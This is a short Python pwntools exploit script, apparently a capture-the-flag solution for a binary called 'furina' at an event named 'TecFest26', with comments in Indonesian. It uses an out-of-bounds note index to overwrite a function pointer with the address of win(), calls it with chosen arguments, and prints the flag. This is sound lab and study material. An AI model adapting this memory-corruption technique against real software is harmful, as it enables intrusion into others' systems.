#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./bin/furina", checksec=False)
context.arch = "amd64"

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40401))
else:
    io = process(["./bin/furina"])

win_addr = exe.symbols["win"]  # no PIE -> statis, dibaca dari attachment binary, tidak di-leak program
log.info(f"win address (dari binary, no PIE): {hex(win_addr)}")

NOTE_LEN = 32
N_VERDICTS = 4
# court.case_notes[N_VERDICTS][NOTE_LEN] diikuti court.verdicts[N_VERDICTS].
# idx = sizeof(case_notes) / NOTE_LEN = (N_VERDICTS*NOTE_LEN) / NOTE_LEN = N_VERDICTS
# -> menulis tepat di verdicts[0].
OOB_IDX = N_VERDICTS

def menu_choice(n):
    io.sendlineafter(b"> ", str(n).encode())

# 1. Tulis write-what-where: overwrite verdicts[0] dengan alamat win()
menu_choice(1)
io.sendlineafter(b"index: ", str(OOB_IDX).encode())
io.sendlineafter(b"panjang: ", b"8")
io.recvuntil(b"isi: ")
io.send(p64(win_addr))

# 2. Jatuhkan putusan index 0 dengan calling convention yang benar
menu_choice(2)
io.sendlineafter(b"index: ", b"0")
io.sendlineafter(b"a: ", str(0x1337).encode())
io.sendlineafter(b"b: ", str(0xC0DE).encode())
io.sendlineafter(b"c: ", str(0xF00DBEEF).encode())

flag = io.recvline_contains(b"TecFest26").strip()
print(flag.decode())
io.close()
